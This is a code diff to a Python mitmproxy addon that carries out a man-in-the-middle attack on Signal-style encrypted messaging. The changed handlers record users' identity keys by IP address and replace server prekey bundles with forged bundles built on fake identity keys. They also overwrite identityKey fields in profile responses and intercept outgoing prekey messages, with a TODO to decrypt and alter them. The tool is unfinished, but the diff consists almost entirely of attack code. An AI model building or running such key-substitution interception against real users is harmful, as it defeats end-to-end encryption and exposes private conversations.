@@ -1,4 +1,5 @@
 # from mitmproxy.http import HTTPFlow
+from mitmproxy.http import HTTPFlow, Request, Response, Headers
 # from mitmproxy import ctx
 from dataclasses import dataclass
 from typing import Optional
@@ -40,6 +41,21 @@ class CiphertextMessageType(Enum):
     PRE_KEY_BUNDLE = 3
     SENDER_KEY_DISTRIBUTION = 7
     PLAINTEXT = 8
+
+class OutgoingMessageType(Enum):
+    PREKEY_BUNDLE = 3
+    UNIDENTIFIED = 6
+
+class EnvelopeType(Enum):
+    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
+    UNKNOWN = 0
+    CIPHERTEXT = 1
+    KEY_EXCHANGE = 2
+    PREKEY_BUNDLE = 3
+    RECEIPT = 5
+    UNIDENTIFIED_SENDER = 6
+    reserved_SENDERKEY_MESSAGE = 7
+    PLAINTEXT_CONTENT = 8
 
 
 @dataclass
@@ -103,8 +119,9 @@ def _v1_registration_req(flow: HTTPFlow):
     # logging.info(f"ADDRESS {flow.client_conn.address[0]}")
 
     req = utils.json_to_dataclass(RegistrationRequest, flow.request.content)
-
-    unidentified_access_key = req.accountAttributes.unidentifiedAccessKey
+    # TODO: json_to_dataclass has issue with inner classes (remain dict instead of dataclass) -- must be investiaged
+    # unidentified_access_key = req.accountAttributes.unidentifiedAccessKey
+    unidentified_access_key = None
 
     aci_iden_key = req.aciIdentityKey
     pni_iden_key = req.pniIdentityKey
@@ -165,6 +182,10 @@ def _v1_registration_resp(flow: HTTPFlow):
     # logging.info(f"RESPONSE: {resp}")
     ip_address = flow.client_conn.peername[0]
 
+    if not registration_info.get(ip_address):
+        logging.error(f"Address {ip_address} not found in registration_info. {registration_info}")
+        return
+
     user = User.insert(
         p_number=resp["number"],
         aci=resp["uuid"],
@@ -197,12 +218,17 @@ def _v2_keys(flow: HTTPFlow):
     # logging.error(req2)
     ip_addr = flow.client_conn.peername[0]
 
-
     # TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(ip_addr):
         logging.error(f"Address {ip_addr} not found in registration_info. {registration_info}")
+        return
 
-    key_data = registration_info[ip_addr].aci_data if identity == "aci" else registration_info[ip_addr].pni_data
+    # try:
+    key_data = registration_info.get(ip_addr).aci_data if identity == "aci" else registration_info.get(ip_addr).pni_data
+
+    if not key_data:
+        logging.warning(f"Registration data for  {ip_addr} (type={identity}) not found, skipping")
+        return
 
     try:
         alice_identity_key_pair = key_data.fake_iden_key
@@ -260,7 +286,7 @@ def _v2_keys(flow: HTTPFlow):
 
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
-def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
+def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):
     # logging.exception((flow.response.content, identifier, device_id))
 
     resp = json.loads(flow.response.content)
@@ -275,9 +301,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     fake_victims = {}
     for _id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-        fake_victim = MitmUser(ProtocolAddress("1", 1))
+        fake_victim = MitmUser(ProtocolAddress("fake_alice", 1))
         fake_victims[_id] = fake_victim
-        bob_registration_id = bundle["registrationId"]
+        bob_registartion_id = bundle["registrationId"]
 
         bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
         bob_kyber_pre_key_signature = b64decode(bundle["pqPreKey"]["signature"] + "==")
@@ -289,7 +315,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         device_id = bundle["deviceId"]
 
         bob_bundle = state.PreKeyBundle(
-            bob_registration_id,
+            bob_registartion_id,
             DeviceId(_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
             state.SignedPreKeyId(1),
@@ -387,11 +413,12 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     _, fake_bundle_wire, fake_user, fake_victim = mitm_bundles[keys[0]]
     resp.update(fake_bundle_wire)
     conversation_session[(ip_address, identifier)] = (fake_user, fake_victim)
+    logging.warn(f"session {conversation_session}")
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
 @api.ws_route("/v1/websocket/")
-def _v1_websocket(_flow, msg):
+def _v1_websocket(_flow: HTTPFlow, msg):
     # logging.info(f"WEBSOCKET: {msg}")
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
@@ -406,11 +433,30 @@ def _v1_websocket(_flow, msg):
     logging.warning(f"Websocket req with id {_id} and path {path}")
 
 
-def _v1_ws_profile_with_credential(flow, identifier, version, credential_request):
+def _v1_ws_profile_with_credential(flow: HTTPFlow, identifier, version, credential_request):
     logging.info(f"my profile: {identifier} {version} {credential_request}")
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
+
+    if registration_info.get(ip_address) is None:
+        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
+        return
+    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
+
+    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
+    flow.response.content = json.dumps(resp).encode()
+    return flow.response.content
+
+
+def _v1_ws_versioned_profile(flow: HTTPFlow, identifier, version):
+    logging.info(f"my profile 2: {identifier} {version}")
+    resp = json.loads(flow.response.content)
+    ip_address = flow.client_conn.address[0]
+
+    if registration_info.get(ip_address) is None:
+        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
+        return
 
     logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
 
@@ -419,22 +465,7 @@ def _v1_ws_profile_with_credential(flow, identifier, version, credential_request
     return flow.response.content
 
 
-def _v1_ws_versioned_profile(flow, identifier, version):
-    logging.info(f"my profile 2: {identifier} {version}")
-    resp = json.loads(flow.response.content)
-    ip_address = flow.client_conn.address[0]
-
-    try:
-        logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
-    except KeyError:
-        logging.exception(f"{registration_info}")
-
-    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
-    flow.response.content = json.dumps(resp).encode()
-    return flow.response.content
-
-
-def _v1_ws_profile(flow, identifier):
+def _v1_ws_profile(flow: HTTPFlow, identifier):
     logging.info(f"{identifier}")
     try:
         uuid_type, uuid = utils.strip_uuid_and_id(identifier)
@@ -467,7 +498,7 @@ def _v1_ws_profile(flow, identifier):
     return flow.response.content
 
 
-def _v1_ws_message(flow, identifier):
+def _v1_ws_message(flow: HTTPFlow, identifier):
     logging.info(f"message: {identifier}")
     logging.info(f"message: {flow.request.content}")
 
@@ -480,29 +511,33 @@ def _v1_ws_message(flow, identifier):
 
     identifier, destination = utils.strip_uuid_and_id(destination_user)
 
+    session = conversation_session.get((ip_address, destination))
+
+    logging.warning(f"SESSION: {session}")
+
     for msg in resp["messages"]:
         if msg["destinationDeviceId"] != 1:
             logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
 
-        msg_type = CiphertextMessageType(int(msg["type"]))
-        logging.warning(f"MESSAGE TYPE: {msg_type}")
+        envelope_type = EnvelopeType(int(msg['type']))
+        logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")
 
-        if msg_type != CiphertextMessageType.PRE_KEY_BUNDLE:
-            logging.error("Only PREKEY_BUNDLE is supported at the moment. C.f. my Twint ;)")
+        if envelope_type not in [EnvelopeType.PREKEY_BUNDLE]:
+            logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
             continue
 
         content = b64decode(msg["content"])[1:]
 
-        ctxt = PreKeySignalMessage()
-        ctxt.ParseFromString(content)
-        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key).decode("ascii")}")
+        msg_type = OutgoingMessageType(int(msg["type"]))
+        if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
+            ctxt = PreKeySignalMessage()
+            ctxt.ParseFromString(content)
+
+        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key).decode()}")
         logging.info(f"ctxt from IK: {ctxt}")
         # TODO: unproduf / decrypt / alter / encrypt / prodobuf 
 
-    # msg_type = CiphertextMessageType(int(resp["type"]))
-    # logging.warning(f"MESSAGE TYPE: {msg_type}")
 
-    # logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
 
 
 def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
@@ -511,7 +546,6 @@ def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
     ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response
 
     pseudo_flow = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
-    from mitmproxy.http import Headers
 
     if rtype == RouteType.REQUEST:
         # todo: handle headers
@@ -541,17 +575,16 @@ ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}
                   _v1_ws_versioned_profile,None)
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile,
                   None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
+
 
 ws_req = Router()
-ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message,
-                 None)
-
-logging.warning(f"ROUTES (REQ): {ws_req.routes}")
-logging.warning(f"ROUTES (RESP): {ws_resp.routes}")
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
 
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
-def _v1_websocket_req(flow, msg):
+def _v1_websocket_req(flow: HTTPFlow, msg):
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
     ws_msg = ws_msg.request
@@ -565,10 +598,12 @@ def _v1_websocket_req(flow, msg):
     websocket_open_state[ws_msg.id].request = ws_msg
     path = websocket_open_state[_id].request.path
 
+    host = flow.request.host if flow.live else HOST_HTTPBIN
+
     flow_decap = decap_ws_msg(flow, msg)
-    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
-    handler, params, _ = ws_req.find_handler(HOST_HTTPBIN, path)
-    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
+
+    handler, params, _ = ws_req.find_handler(host, path)
+    logging.warning(f"HANDLER (req): {handler}, PARAMS: {params} -- {host} / {path}")
     if handler:
         req = handler(flow_decap, *params.fixed, **params.named)
         if req:
@@ -580,7 +615,7 @@ def _v1_websocket_req(flow, msg):
 
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
-def _v1_websocket_resp(flow, msg):
+def _v1_websocket_resp(flow: HTTPFlow, msg):
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
     ws_msg = ws_msg.response
@@ -589,18 +624,19 @@ def _v1_websocket_resp(flow, msg):
     _id = ws_msg.id
 
     if not websocket_open_state.get(_id):
-        logging.warning(f"Message request does not exist for id {_id}")
+        logging.info(f"Message request does not exist for id {_id}: {ws_msg.body}")
         return
-    # websocket_open_state[ws_msg.id].request = ws_msg
+
     path = websocket_open_state[_id].request.path
 
     websocket_open_state[_id].response = ws_msg
     logging.warning(f"Websocket resp with id {_id} and path {path}")
 
+    host = flow.request.host if flow.live else HOST_HTTPBIN
+
     unwrapped_flow = decap_ws_msg(flow, msg, RouteType.RESPONSE)
-    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
-    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path)
-    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
+    handler, params, _ = ws_resp.find_handler(host, path)
+    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {host} / {path}")
     if handler:
         resp = handler(unwrapped_flow, *params.fixed, **params.named)
         if resp:
